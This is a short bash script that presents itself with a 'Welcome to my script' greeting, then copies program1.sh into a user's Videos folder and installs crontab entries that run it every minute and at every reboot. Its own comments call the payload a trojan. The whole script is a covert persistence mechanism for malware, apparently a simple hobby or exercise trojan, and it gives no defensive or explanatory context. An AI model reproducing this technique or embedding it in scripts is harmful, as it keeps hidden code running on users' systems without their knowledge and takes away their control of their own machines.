#!/bin/bash

echo 'Welcome to my script';

cp -r program1.sh /home/vicky/Videos/program1.sh
#Crontab for running trojan every minutes

crontab -l > everyMin

echo "*/1 * * * * bash /home/vicky/Videos/program1.sh" >> everyMin

crontab everyMin

rm -r everyMin

#Crontab for running trojan for every bootup
crontab -l > bootup

echo "@reboot /home/vicky/Videos/program1.sh" >> bootup

crontab bootup

rm -r bootup


